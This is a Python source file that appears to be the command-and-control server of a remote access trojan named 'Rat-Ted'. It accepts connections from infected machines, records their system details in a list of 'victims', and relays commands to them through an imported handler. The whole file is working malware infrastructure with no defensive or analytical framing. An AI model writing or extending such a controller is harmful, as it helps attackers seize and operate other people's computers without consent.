import socket
from host.handler.command_handler import execute_command
from host.handler import command_importer
import select
import threading


class SingletonMeta(type):
    _instances = {}

    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            instance = super(SingletonMeta, cls).__call__(*args, **kwargs)
            cls._instances[cls] = instance
        return cls._instances[cls]


class RAT_SERVER(metaclass=SingletonMeta):
    instance = None  # Class variable to store the instance

    def __init__(self, host, port):
        if not RAT_SERVER.instance:
            self.host = host
            self.port = port
            self.clients = []  # The connection with the clients
            # Information about the clients but more for information instead of the connection available
            self.victims = []
            RAT_SERVER.instance = self  # Set the instance to this object

    def build_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for clients...")

        while True:
            client, addr = s.accept()
            self.clients.append((client, addr))
            print(f"[*] Connection is established successfully with {addr[0]}")

            # Once connection has been established, start a new thread to handle the client
            # We expect information back from the client
            output = self.receive_output(client)
            print(f"[*] Output received: {output}")

            # Example output:

            # Output received: System: Windows-10-10.0.23555-SP0 Core|Version: 10.0.23555|Architecture: ('64bit', 'WindowsPE')|Name of Computer: Lukas|Processor: AMD64 Family 25 Model 33 Stepping 2, AuthenticAMD|Python: 3.10.9|User: lukma|IPv4: 192.168.87.22|IPv6: 192.168.87.22|Uptime: 8:09:16.999999|Privileges: 0|Bit: AMD64|Rat-Ted-Version: 1.0.0

            # Turn it into a dict so we can access the information easily

            output = output.split("|")
            output_dict = {}
            for item in output:
                item = item.split(":")
                output_dict[item[0]] = item[1]

            # Add the client to the list of victims
            print(
                f"[*] Adding {output_dict['Name of Computer']} to the list of victims")
            
            # check if the client is already in the list of victims
            for victim in self.victims:
                if victim["Name of Computer"] == output_dict["Name of Computer"]:
                    self.victims.remove(victim)
            self.victims.append(output_dict)

    def receive_output(self, client_socket):
        try:
            # Make a time limit for the output
            # If the output is not received in 5 seconds, return an error
            print("Receiving output")

            # wait for the output for 5 seconds
            ready = select.select([client_socket], [], [], 5)

            if ready[0]:
                return client_socket.recv(1024).decode()
            else:
                return "Error receiving output"
        except Exception as e:
            print(f"Error receiving output: {str(e)}")

    def handle_client(self, client_socket):
        while True:
            try:
                command = client_socket.recv(1024).decode()
                if not command:
                    break
                output = self.execute(command, client_socket)
                if output is not None:
                    client_socket.send(output.encode())
            except Exception as e:
                print(f"Error handling client: {str(e)}")
                break

        client_socket.close()

    def execute(self, command, client_socket):
        # Execute the command
        try:
            execute_command(self, command, client_socket)
        except Exception as e:
            output = str(e)
            client_socket.send(output.encode())
